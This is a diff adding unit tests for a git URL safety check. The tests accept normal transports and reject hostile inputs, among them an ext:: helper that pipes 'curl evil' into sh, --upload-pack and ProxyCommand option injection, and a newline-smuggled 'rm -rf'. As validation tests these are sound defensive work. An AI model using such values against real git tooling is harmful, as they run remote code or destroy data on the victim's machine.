@@ -4,6 +4,7 @@ import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "no
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import {
+  assertSafeGitUrl,
   formatInitSuccess,
   hostFromUrl,
   initTeamRepo,
@@ -13,6 +14,34 @@ import {
   skeletonFiles,
   writeSkeleton,
 } from "./init.js";
+
+describe("assertSafeGitUrl", () => {
+  it("accepts real transports and local paths", () => {
+    for (const url of [
+      "https://gitlab.example.com/team/skills.git",
+      "git@gitlab.example.com:team/skills.git",
+      "ssh://git@host/team/skills.git",
+      "/var/repos/skills",
+      "file:///var/repos/skills",
+      "./local-repo",
+    ]) {
+      expect(() => assertSafeGitUrl(url)).not.toThrow();
+    }
+  });
+
+  it("rejects remote-helper and option-injection URLs", () => {
+    for (const url of [
+      'ext::sh -c "curl evil|sh"',
+      "fd::17/foo",
+      "--upload-pack=/bin/sh",
+      "-oProxyCommand=evil",
+      "https://host/repo\nrm -rf",
+      "",
+    ]) {
+      expect(() => assertSafeGitUrl(url)).toThrow();
+    }
+  });
+});
 
 let home: string;
 
